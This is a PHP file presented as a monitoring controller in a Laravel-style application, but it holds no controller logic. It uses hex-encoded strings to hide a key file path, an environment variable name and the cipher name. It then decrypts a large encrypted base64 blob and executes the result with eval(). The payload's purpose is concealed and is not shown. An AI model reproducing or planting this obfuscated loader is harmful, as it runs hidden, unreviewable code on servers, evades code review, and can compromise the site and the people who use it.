<?php
namespace App\Http\Controllers\Monitoring;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3wh0ZNBYuW2w6XAEiSt5Rg==');

$c=base64_decode(

'hTQ1sDgR+EaVGxdKzbY3ww+pleWe8zNr9dXPRF9uhcflX+xej2qlEuS2h46yq56yioIkgeoqnJc6' .
'QQk56Oapmu2z9dj9X7eXNUjFSCKI+AuBqpGeVztTKPEoN8Keh5GXBZ54kmz2RDCO1Oe6cchzdlta' .
'19mERlnINpUNIlk0zyc/r2dswBEwsNitW4WPtJmAq7kSHBivZ0/CLJ5X9uqi8fOBBPcf4JSpDrm8' .
'fqB/YlvJr+VTcMF3NINTDuVzMH6iK8EOGD0nqyexasJMxsu2MrJfoT1/kou+N//hs/XbFNrFu+w5' .
'kwmtu61WcmK1YpfLLhKXcUIblqciDW6r48wTt/MDkcVtcjRTepXjNkk2gNTX5W8eugbC85p5qDHX' .
'KE+aQBLEjlyjzo8aRXBQQrwKDfhl7x3P7JePDw1tjMIx6He91Da3GIPJgSzXx7hed9iUv922/rFJ' .
'claDdXC2zqylzUQXA9DYr+haZQdOmkOwlrWHwdv7pKovBjCYTFToRp2gC8XznY7xKBnl6kEkSBIE' .
'mOcoomUDHtzMer41QjIys6pexQWcw6OPezbUVYfAdE2ahECrp7X7ZOqeHN3W/rKFU0Hhxu5nFg7k' .
'p7ozzJUgPXJm2VNrsjmch1MHAd7oQZRnWgmdVU0v/oHcUCCEp8V+c1D3GB24pIb83Qt02H48NhqG' .
'4w8LpUz4eS2P+cZQi+6gIN2SVAyfg8E/aEvrgd8QtyknEoqC2h+8vWkTEamuGOOSOZoQrQLhPYdx' .
'+wELuZKY+UqQuHNQFFx2jTObUVKJkw+PtNz6zSKypFr+arATYwyxaRDe7YBq0W4b6cB9i44d+fJO' .
'ZEwMe2V6MR3CvkqQwpspXuS/hOscl7G1lqgxq+P4poHfWBTkItWnttDyQW6paWwabnz1PoJtE1ri' .
'qPvc3SnwIBVGy75f7rjq50HOgsuGIFUoNHPF9qqYdYznTAQOPQRJNL2tcT/jLJGnGq3dc6B9BIVP' .
'kri8pRbrZOmydV+OONmH1Bo2aTvjUIvrIvJ9uFLpAsP3YSAxCuGQldAJr2XVrSWO/Bw1z5m97OX+' .
'TGWxIBtLOFxK4z7t2d9pYtNmV1U5CzYMFn/HBTrBkjVn3gvUyO0tzRIXmn3UnoRyyXcTuWpKVNLB' .
'J6zILCT8uw086HhuzHPi87fLfugDXUeAM07woH/GK371WoA3kFERj83mnEIqK1/Kq5gkBMx1ScOs' .
'IKEBldgg6EvDTU7Yq1jUrnf9Ys89Ozq10pJ0YEYskAa17P1Lp+yJovUkKVdC/j3vftHALxR1Whun' .
'8Lk6UPKDw9V79UDBaz8Qa8rAw5pSgH6WY4sDjl/arU1RRP53XC9KqsRbpe6UifvNYskL2ow0bLK4' .
'LHp5v+u6qEpBtvqB3aY5wMgVti6/mC09vHnnSmCiumalEMxsHrYI8rno/fMCRf9nMdxT8RdBepiM' .
'yVV/Djufmv3IgSVrqXJ5revRs/MHNLAhTwru9YDkn9DqzDvKxeg7iTySEm+5HHPpnfUhJIe03VJZ' .
'KxDIKt5lb0/udiDr9icZo08LHEoR1op/fCfrfysB3NA6XNIgpUW7ncc7LiXFFNhNImjQK8guZfwp' .
'wK4pPWGzsTpNPI9ZtM4rJUg0RKtYuh1INuxG+B5/hKiupRaClvZBXH/n29lohUaPmZtxkNApxsu8' .
'DQX0PnGayWSbex8fddfA4kuNzfgee3Hc1kCy+HQmnIb08XnQYvdT9o7x'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

